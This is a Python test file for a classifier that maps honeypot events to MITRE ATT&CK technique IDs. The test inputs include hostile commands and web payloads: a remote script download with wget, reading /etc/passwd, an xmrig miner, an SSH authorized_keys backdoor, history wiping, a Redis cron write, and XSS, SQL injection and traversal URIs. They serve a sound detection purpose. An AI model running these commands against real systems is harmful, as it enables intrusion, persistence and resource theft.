from app import mitre


def ids(doc):
    return set(mitre.classify(doc)[0])


def test_ssh_login_and_shell():
    assert "T1110" in ids({"protocol": "SSH", "password": "root"})
    t = ids({"protocol": "SSH", "command": "wget http://198.51.100.7/x.sh -O /tmp/x.sh"})
    assert {"T1059.004", "T1105"} <= t
    assert "T1003" in ids({"protocol": "SSH", "command": "cat /etc/passwd"})
    assert "T1082" in ids({"protocol": "SSH", "command": "uname -a"})
    assert "T1033" in ids({"protocol": "TELNET", "command": "whoami"})
    assert "T1613" in ids({"protocol": "SSH", "command": "docker ps"})
    assert "T1496" in ids({"protocol": "SSH", "command": "./xmrig -o stratum+tcp://pool:3333"})
    assert "T1098.004" in ids({"protocol": "SSH", "command": "echo k >> ~/.ssh/authorized_keys"})
    assert "T1070" in ids({"protocol": "SSH", "command": "history -c && rm -rf /tmp/x"})


def test_http_rules():
    assert "T1110" in ids({"protocol": "HTTP", "method": "GET", "uri": "/wp-login.php"})
    assert "T1190" in ids({"protocol": "HTTP", "method": "GET", "uri": "/?q=<script>alert(1)</script>"})
    assert "T1190" in ids({"protocol": "HTTP", "method": "GET", "uri": "/a?id=1 union select 1,2,3"})
    assert "T1190" in ids({"protocol": "HTTP", "method": "GET", "uri": "/../../etc/passwd"})
    assert "T1552" in ids({"protocol": "HTTP", "method": "GET", "uri": "/.env"})
    assert "T1190" in ids({"protocol": "HTTP", "uri": "/", "user_agent": "sqlmap/1.5"})
    assert "T1595" in ids({"protocol": "HTTP", "uri": "/", "user_agent": "zgrab/0.x"})
    # generic probe falls back to Active Scanning
    assert ids({"protocol": "HTTP", "method": "GET", "uri": "/random"}) == {"T1595"}


def test_tcp_and_browser():
    t = ids({"protocol": "TCP", "command": "CONFIG SET dir /var/spool/cron"})
    assert {"T1210", "T1046"} <= t
    assert ids({"protocol": "TCP", "command": "PING"}) == {"T1046"}
    assert mitre.classify({"source": "browser", "protocol": "WEB", "url": "https://x"}) == ([], [])


def test_tactics_resolved_and_ordered():
    _, tactics = mitre.classify({"protocol": "SSH", "password": "x", "command": "wget http://a/b"})
    # T1110 Credential Access, T1059.004 Execution, T1105 Command and Control — tactic order preserved
    assert tactics == sorted(tactics, key=mitre.TACTICS.index)
    assert "Credential Access" in tactics and "Execution" in tactics


def test_catalog_complete():
    cat = mitre.catalog()
    assert cat["tactics"] == mitre.TACTICS
    for tid, info in cat["techniques"].items():
        assert info["tactic"] in mitre.TACTICS
        assert mitre.name_of(tid) == info["name"]
